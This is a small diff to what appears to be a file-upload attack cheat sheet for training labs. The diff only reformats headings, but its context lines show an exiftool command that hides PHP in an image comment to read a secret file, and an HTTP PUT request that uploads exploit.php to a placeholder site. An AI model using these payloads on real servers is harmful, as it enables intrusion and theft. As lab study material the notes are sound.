@@ -14,7 +14,7 @@ Erlang Yaws Web Server: .yaws
 
 
 ####################################################
-         ###Bypass file extensions checks
+         ### Bypass file extensions checks
 ####################################################
 
 1) If above is not working then try these also
@@ -49,7 +49,7 @@ exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret'
 
 
 
-____Uploading using PUT____
+## Uploading using PUT____
 PUT /images/exploit.php HTTP/1.1
 Host: vulnerable-website.com
 Content-Type: application/x-httpd-php
